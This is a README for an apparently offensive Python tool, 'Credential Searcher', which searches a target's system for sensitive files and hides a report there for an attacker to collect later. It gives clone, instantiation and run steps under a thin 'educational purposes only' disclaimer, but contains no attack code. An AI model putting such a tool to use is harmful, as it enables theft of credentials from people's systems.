# Credential Searcher

## Disclaimer

This script is for educational purposes only, I don't endorse or promote it's illegal usage

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [Languages](#languages)
4. [Installations](#installations)
5. [Usage](#usage)
6. [Run](#run)

## Overview

This script allows an attacker to search for sensitive files in a target's system

## Features

- Searches for sensitive files on the target's system
- Saves and hides the search report in the target's sytem in other to be accessed later

## Languages

- Python 3.9.7

## Installations

```shell
git clone https://github.com/favoursyre/credential-searcher.git && cd credential-searcher
```

## Usage

Instantiating the class

```python
filename = None #Use this setup to use the set of file keywords available in the script
#OR
filename = "filename" #Use this setup to search for a particular file

attacker, target= "Syre Musk", "Konoha"
search = CredentialSearcher(attacker, target).byakugan(filename)
```

## Run

```bash
python credential_searcher.py
```
